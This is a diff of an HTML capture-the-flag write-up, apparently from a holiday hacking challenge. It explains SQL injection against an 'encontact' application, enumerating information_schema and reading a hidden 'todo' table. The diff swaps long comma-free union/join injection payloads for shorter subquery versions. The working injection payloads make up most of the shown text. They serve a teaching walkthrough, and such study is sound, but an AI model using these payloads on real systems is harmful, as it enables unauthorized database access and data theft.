@@ -53,23 +53,23 @@ Due to the fact, that the <code>union</code> database has 7 columns, it has to b
 <p>We can obtain a list of all interesting tables in the MySQL database using this SQL statement:</p>
 <pre><code>select table_name from information_schema.tables;
 </code></pre>
-<p>As <code>information_schema</code> has 23 columns and we are interested in column #3 (<code>table_name</code>), this can be rewritten for our SQLi flaw:</p>
-<pre><code>select * from (select 1)a1 join (select 2)a2 join (select F.3 from (select * from (select 1)i1 join (select 2)i2 join (select 3)i3 join (select 4)i4 join (select 5)i5 join (select 6)i6 join (select 7)i7 join (select 8)i8 join (select 9)i9 join (select 10)i10 join (select 11)i11 join (select 12)i12 join (select 13)i13 join (select 14)i14 join (select 15)i15 join (select 16)i16 join (select 17)i17 join (select 18)i18 join (select 19)i19 join (select 20)i20 join (select 21)i21 join (select 22)i22 join (select 23)i23 union select * from information_schema.tables)F)d join (select 3)j join (select 4)k join (select 5)l join (select 6)m;--
+<p>This can be rewritten for our SQLi flaw:</p>
+<pre><code>select * from (select 1)a1 join (select 2)a2 join (select table_name from information_schema.tables)d join (select 3)j join (select 4)k join (select 5)l join (select 6)m;--
 </code></pre>
 <p>This reveals, that in addition to the tables <code>emails</code> and <code>uniquecontact</code>, which are known as they are used in the application and in the provided schema of encontact <code>encontact_db.sql</code>, there is an additional table <code>todo</code>, which seems to be the todo list we need access to.</p>
 <p>Using the SQL statement</p>
 <pre><code>select column_name from information_schema.columns where table_name="todo"
 </code></pre>
 <p>the list of columns in the table <code>todo</code> can be obtained.<br>
-As <code>columns</code> has 22 columns with <code>column_name</code> being at position #4, this can be rewritten for the SQLi as follows:</p>
-<pre><code>select * from (select 1)a1 join (select 2)a2 join (select F.4 from (select * from (select 1)i1 join (select 2)i2 join (select 3)i3 join (select 4)i4 join (select 5)i5 join (select 6)i6 join (select 7)i7 join (select 8)i8 join (select 9)i9 join (select 10)i10 join (select 11)i11 join (select 12)i12 join (select 13)i13 join (select 14)i14 join (select 15)i15 join (select 16)i16 join (select 17)i17 join (select 18)i18 join (select 19)i19 join (select 20)i20 join (select 21)i21 join (select 22)i22 union select * from information_schema.columns where table_name="todo")F)d join (select 3)j join (select 4)k join (select 5)l join (select 6)m;--
+This can be rewritten for the SQLi as follows:</p>
+<pre><code>select * from (select 1)a1 join (select 2)a2 join (select column_name from information_schema.columns where table_name="todo")d join (select 3)j join (select 4)k join (select 5)l join (select 6)m;--
 </code></pre>
 <p>we can see, that this table consists out of 3 columns: <code>id</code>, <code>note</code>, <code>completed</code>.<br>
 The <code>note</code> column can then be extracted using</p>
 <pre><code>select note from todo
 </code></pre>
 <p>Rewritten for the SQLi:</p>
-<pre><code>select * from (select 1)a1 join (select 2)a2 join (select F.2 from (select * from (select 1)i1 join (select 2)i2 join (select 3)i3 union select * from todo)F)d join (select 3)j join (select 4)k join (select 5)l join (select 6)m;--
+<pre><code>select * from (select 1)a1 join (select 2)a2 join (select note from todo)d join (select 3)j join (select 4)k join (select 5)l join (select 6)m;--
 </code></pre>
 <p>This brings up Jack Frosts todo list:</p>
 <ul>
